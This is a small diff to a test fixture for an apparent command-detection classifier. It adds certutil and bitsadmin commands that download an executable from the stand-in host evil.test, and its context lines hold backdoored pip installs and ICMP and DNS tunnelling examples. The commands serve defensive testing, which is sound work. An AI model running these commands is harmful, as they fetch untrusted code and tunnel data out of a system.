@@ -51,6 +51,8 @@ TECH_CAUGHT = [
     ("pip install git+https://evil.test/backdoor.git", "pkg.install_untrusted"),
     ("ping -c1 -p 4141deadbeef evil.test", "egress.icmp_tunnel"),
     ("dig -t txt aGVsbG8.tunnel.evil.test", "egress.dns_tool"),
+    ("certutil -urlcache -f http://evil.test/p.exe p.exe", "exec.lolbin_download"),
+    ("bitsadmin /transfer j http://evil.test/p.exe c:\\p.exe", "exec.lolbin_download"),
 ]
 TECH_BENIGN = [
     ("cat build.log | python3 parse.py", "exec.pipe_to_shell"),  # not curl|python — wait, still pipe; see note
@@ -60,6 +62,7 @@ TECH_BENIGN = [
     ("pip install requests", "pkg.install_untrusted"),
     ("ping -c1 github.com", "egress.icmp_tunnel"),
     ("dig github.com", "egress.dns_tool"),
+    ("certutil -hashfile installer.exe SHA256", "exec.lolbin_download"),  # local hash, no download
 ]
 
 
